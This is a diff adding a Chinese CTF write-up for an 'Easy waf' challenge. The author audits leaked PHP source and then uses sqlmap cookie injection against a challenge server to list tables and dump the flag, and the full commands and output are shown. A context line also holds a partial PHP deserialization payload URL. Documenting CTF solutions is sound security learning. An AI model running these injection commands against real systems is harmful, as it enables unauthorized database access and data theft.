@@ -301,6 +301,84 @@ http://120.78.187.100:8081/?user=php://input&file=class.php&pass=O:4:"Read":1:{s
 
 ### Easy waf
 
+随手扫一下后台，得到了一个 www.zip 的源码包，然后就是代码审计了。
+
+一开始毫无经验，看了好久的源码之后，还是不知从何下手，顺手把 PHP 和 MySQL 学了。
+
+第一想法是 `username` 和 `password` 可以注入，毕竟过滤函数不会对他们进行处理。
+
+```shell
+foreach ($_POST as $key => $value) {
+    if ($key != "username"&&strstr($key, "password") == false) {
+        $_POST[$key] = filtering($value);
+    }
+}
+```
+
+但是这玩意就算有注入也不太好玩呀？？注入什么才会显示 flag 呢？这是一个问题 [常用手工注入语句](https://blog.csdn.net/wizardforcel/article/details/59480461)
+
+后面又发现 `uesr_id` 可以注入，最终在 `login.php` 中找到 `user_id` 的来源，就是数据库中的键。
+
+```php
+// index.php
+<h2>历史留言</h2>
+<?php
+    $user_id=$_SESSION['user_id'];
+	$sql = "select * from content where user_id=$user_id";
+	$arr = select($sql);
+?>
+    
+// login.php
+$_SESSION['username'] = $a['username'];  // 在这里
+$_SESSION['user_id'] = $a['id'];		 // 手动高亮
+```
+
+询问朋友得知可以 cookie 注入，突然又有了新思路，手工注入又不太会，先跑跑 sqlmap 试试。[参考博客](https://blog.csdn.net/u011781521/article/details/58135307)
+
+```shell
+# 1.cookie 注入，猜解表
+sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --table --level 2
+# do you want to URL encode cookie values (implementation specific)? [Y/n] Y
+[10:42:28] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9.0 (stretch)
+web application technology: PHP 5.6.38, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12
+Cookie parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+# do you want to use common table existence check? [Y/n/q] Y 10
+# 表已经跑出来了
+Database: 2018_hdb_waf 
+[3 tables]
++---------------------------------------+
+| user                                  |
+| content                               |
+| flag                                  |
++---------------------------------------+
+
+# 2.选择表猜解字段(flag)
+sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --column -T flag --level 2
+Table: flag
+[1 column]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| flag   | varchar(255) |
++--------+--------------+
+
+# 3.猜解内容
+sqlmap -u http://120.78.187.100:8082/content.php --cookie "message_id=1412" --dump -T flag --level 2
+[10:44:45] [INFO] retrieved: 1
+[10:44:45] [INFO] retrieved: flag{b4d_eregi_d0_noT_uSe_1t}
+Database: 2018_hdb_waf
+Table: flag
+[1 entry]
++-------------------------------+
+| flag                          |
++-------------------------------+
+| flag{b4d_eregi_d0_noT_uSe_1t} |
++-------------------------------+
+# 至此，flag 已经成功获得，第一次成功用sqlmap跑出来还是蛮激动的，哈哈哈，爽~
+```
+
 
 
 ### 咕咕 shop
